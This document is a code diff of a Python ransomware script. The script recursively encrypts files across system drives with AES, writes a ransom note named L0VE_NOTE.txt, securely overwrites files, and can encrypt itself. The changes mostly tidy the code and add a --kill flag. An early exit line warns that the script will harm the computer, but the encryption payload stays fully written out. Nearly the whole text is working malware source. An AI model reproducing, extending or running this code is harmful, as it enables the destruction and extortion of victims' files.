@@ -111,7 +111,7 @@ elif sys.platform.lower() in ["win32", "win64", "windows", "nt"]:
     paths = "C:\\ ", "D:\\ ", "E:\\ ,""."
 
 else:
-    raise(Colors.white+"Unknown OS")
+    raise Exception("Unknown OS")
 
 # --------------------------------------------------------------------------
 
@@ -145,8 +145,8 @@ class AesExcalibur:
     def __init__(self, password: bytes):
         """
 
-        :type password: Base64 encoded string to be hashed
-        :param total:   Integer used to count the total number of modified files
+        :param password: Base64 encoded string to be hashed
+        :type total:   Integer used to count the total number of modified files
         """
         self.key = SHA256.new(password).digest()  # Base64 encoded password
         self.total = 0  # Total amount of files modified
@@ -211,7 +211,8 @@ def parse_args(args):
                         help="Decrypt the entire filesystem", required=False)
 
     parser.add_argument("-s", "--secret", type=str, help="Password to use as key")
-    # parser.add_argument("-p", "--passes", type=int, help="Number of passes for shredding file")
+    parser.add_argument("-k", "--kill", default=False, required=False,
+                        action="store_true", help="Encrypt this file before exiting")
     return parser.parse_args(args)
 
 
@@ -230,16 +231,14 @@ def recursive_walk(path_list, extensions, mode):
         for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
             for file in files:
                 if file not in [sys.argv[0], __name__, "L0VE_NOTE.txt"]:  # Ignore self and ransom note
-                    abs_path = os.path.join(root, file)  # Get the files absolute path and extension
-                    ext = abs_path.split(".")[-1]
+                    abs_path = os.path.join(root, file)  # Get the files absolute path
+                    ext = abs_path.split(".")[-1]  # Isolate the file's extension
                     if mode is 1:
                         if ext in extensions:
                             yield os.path.join(root, file)
                     elif mode is 2:
                         if "AeS" in ext:
                             yield os.path.join(root, file)
-                    else:
-                        raise Exception("Incorrect mode parameter was passed!")
 
 
 def secure_delete(filename, passes=5):
@@ -252,6 +251,7 @@ def secure_delete(filename, passes=5):
 
     if not os.path.exists(filename):  # Most secure delete ever
         return
+
     with open(filename, "ab+") as f:
         length = f.tell()  # Read each line of the file until the end
         for _ in range(0, passes):  # _ in python is short for a variable that isn't used
@@ -268,9 +268,14 @@ def serve_payload(mode, password):
     :param password:  Password variable to be base64 encoded and hashed with SHA256
     """
 
-    start = time()  # Start benchmarking payload time
+    # Start benchmarking payload time
+    start = time()
+
+    # Base64 encode password and convert to bytes
     encoded_pass = encodebytes(bytes(password, "utf-8"))
-    sanctuary = AesExcalibur(encoded_pass)  # Initialize encryption object in memory (Also encrypts key)
+
+    # Initialize encryption object in memory (Also encrypts key)
+    sanctuary = AesExcalibur(encoded_pass)
 
     files: Generator[Union[bytes, str], Any, Any] = recursive_walk(paths, target_extensions, mode)
 
@@ -279,19 +284,16 @@ def serve_payload(mode, password):
 
         if mode is 1:
             print(Colors.blue + "Encrypting system")
-            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
-                                                  ascii=True, desc="Encryption status"))
-
+            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" file", ascii=True, desc="Encryption status"))
             try:
                 for path in paths:
                     with open(path + "/L0VE_NOTE.txt", "w+") as f:
                         f.write(note)
             except: pass
 
-        elif mode is 2:  # Begin applying decryption
+        elif mode is 2:
             print(Colors.green + "Decrypting system")
-            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
-                                                  ascii=True, desc="Decryption status: "))
+            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" files", ascii=True, desc="Decryption status: "))
             try:
                 for path in paths:
                     with open(path + "/L0VE_NOTE.txt", "w+") as f:
@@ -303,11 +305,11 @@ def serve_payload(mode, password):
     print(Colors.blue + "Total runtime: {}\n".format(time() - start))
 
     # # Encrypt this file
-    answer = input("Encrypt this file? [y/n]")
+    answer = input(Colors.red + "Encrypt this file? [y/n]")
     if answer in ["y", "Y", "yes", "YES"]:
         sanctuary.encrypt_file(os.path.abspath(__file__))
     else:
-        sys.exit(0)
+        exit(0)
 
 # --------------------------------------------------------------------------
 
@@ -317,10 +319,12 @@ def main(args=None):
     Recursively encrypt or decrypt the filesystem
     Print beautiful artwork
     Ward away the skids with the almighty exit()
+
+    :param args: Input from sys.argv, defaults to None
     """
 
     os.system("clear" if "linux" in sys.platform else "cls")
-    exit("THIS WILL HARM YOUR COMPUTER")
+    exit(Colors.red + "THIS WILL HARM YOUR COMPUTER")
     print(Colors.blue + ascii_art)
 
     # If user entered any arguments, run them through parse_args()
@@ -343,7 +347,7 @@ def main(args=None):
             exit(Colors.red + "Invalid input")
 
     # User chose to encrypt system
-    elif args.encrypt:
+    elif args.encrypt and not args.decrypt:
 
         # User entered some args but didn't enter a password variable
         if not args.secret:
@@ -353,7 +357,7 @@ def main(args=None):
             serve_payload(mode=1, password=args.secret)
 
     # User chose to decrypt system
-    elif args.decrypt:
+    elif args.decrypt and not args.encrypt:
 
         # User entered some args but didn't enter a password variable
         if not args.secret:
@@ -361,6 +365,9 @@ def main(args=None):
             serve_payload(mode=2, password=password)
         else:
             serve_payload(mode=2, password=args.secret)
+
+    else:
+        exit(Colors.red + "Invalid arguments")
 
 
 if __name__ == '__main__':
